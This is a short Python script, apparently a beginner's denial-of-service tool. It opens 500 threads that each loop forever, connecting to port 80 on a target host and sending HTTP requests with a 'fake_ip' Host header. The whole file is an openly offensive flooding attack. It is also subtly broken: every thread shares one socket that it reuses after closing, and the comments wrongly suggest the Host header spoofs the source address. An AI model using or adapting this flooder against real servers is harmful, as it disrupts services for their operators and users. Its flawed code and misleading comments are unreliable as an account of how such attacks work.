import threading
import socket

# this is very similar to a normal socket client to a server, we need the ip address/port and ipv type 
# of the target server and then we create the socket for it.
target = socket.gethostbyname(socket.gethostname())
port = 80
fake_ip = "182.21.20.32"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ADDR = (target, port)

already_connected = 0

# here we repeat the whole process of sending connection to the server and closing it
# we also send our fake ip address to the server (not very good idea!)
# this is an infinite loop
def attack():
    while True:
        s.connect(ADDR)
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), ADDR)
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), ADDR)
        s.close()
        
        global already_connected
        already_connected += 1
        print(already_connected)
    
# create 500 different threads and try to connect to the server in each thread, concurrently
for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
    